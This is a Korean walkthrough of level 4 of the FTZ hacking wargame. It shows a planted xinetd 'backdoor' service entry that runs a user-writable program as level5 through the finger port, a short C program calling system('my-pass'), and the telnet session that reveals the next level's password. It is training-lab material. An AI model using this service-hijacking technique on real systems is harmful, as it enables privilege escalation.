PW : `suck my brain`

```bash
[level4@ftz level4]$ cat hint


누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!
```
~~누구냐!!~~  
`/etc/xinetd.d/` 디렉토리는 네트웍 접근 제어를 담당하는 파일이 있는 곳입니다.

```bash
[level4@ftz level4]$ ls /etc/xinetd.d -l
total 80
-r--r--r--    1 root     level4        171 Sep 10  2011 backdoor
-rw-r--r--    1 root     root          560 Dec 19  2007 chargen
-rw-r--r--    1 root     root          580 Dec 19  2007 chargen-udp
-rw-r--r--    1 root     root          417 Dec 19  2007 daytime
-rw-r--r--    1 root     root          437 Dec 19  2007 daytime-udp
-rw-r--r--    1 root     root          339 Dec 19  2007 echo
-rw-r--r--    1 root     root          358 Dec 19  2007 echo-udp
-rw-r--r--    1 root     root          317 Dec 19  2007 finger
-rw-r--r--    1 root     root          273 Dec 19  2007 ntalk
-rw-r--r--    1 root     root          359 Dec 19  2007 rexec
-rw-r--r--    1 root     root          376 Dec 19  2007 rlogin
-rw-r--r--    1 root     root          429 Dec 19  2007 rsh
-rw-r--r--    1 root     root          317 Dec 19  2007 rsync
-rw-r--r--    1 root     root          310 Dec 19  2007 servers
-rw-r--r--    1 root     root          312 Dec 19  2007 services
-rw-r--r--    1 root     root          406 Dec 19  2007 sgi_fam
-rw-r--r--    1 root     root          261 Dec 19  2007 talk
-rw-r--r--    1 root     root          305 Sep 10  2011 telnet
-rw-r--r--    1 root     root          495 Dec 19  2007 time
-rw-r--r--    1 root     root          515 Dec 19  2007 time-udp
```
여기에 backdoor라는 파일이 있다. 읽을 수 있으니 열어보면
```bash
[level4@ftz level4]$ cat /etc/xinetd.d/backdoor
service finger
{
        disable = no
        flags           = REUSE
        socket_type     = stream
        wait            = no
        user            = level5
        server          = /home/level4/tmp/backdoor
        log_on_failure  += USERID
}
```
이렇게 나온다. 뭔지는 잘 모르더라도 ~/tmp/backdoor 파일에 무언가가 있음을 짐작할 수 있고, 이것에 level5권한으로 실행 된다는 느낌이 든다.
그리고 서비스는 `finger`라는 것을 알 수 있다.

만약에 backdoor라는 파일에 my-pass를 실행하는 코드가 있다면 어떻게 될까?

```c
// backdoor.c

#include <stdio.h>

int main() {
	system("my-pass");
	return 0;
}
```
```bash
$ gcc backdoor.c -o backdoor
$ telnet localhost 79
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.

Level5 Password is "what is your name?".

Connection closed by foreign host.

```

level5의 패스워드는 `what is your name?`이다.
